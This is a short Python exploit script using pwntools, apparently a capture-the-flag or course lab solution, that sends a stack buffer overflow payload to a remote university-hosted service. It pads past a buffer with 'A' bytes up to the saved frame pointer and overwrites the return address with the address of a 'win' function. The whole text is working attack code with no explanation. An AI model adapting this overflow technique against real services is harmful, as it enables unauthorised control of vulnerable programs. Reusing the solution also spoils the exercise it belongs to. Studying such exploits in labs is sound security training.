#!/bin/python3.11
from pwn import *

# S = process('./bin')
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9992)

elf = ELF("./bin")

addrsWin = elf.symbols['win']

fp = 0xffffce3c

buffer = 0xffffcdfc

offset = fp - buffer

payload = b'A' * offset + p32(addrsWin)

print(S.recvuntil(b'win.\n'))
S.sendline(payload)
print(S.recvall())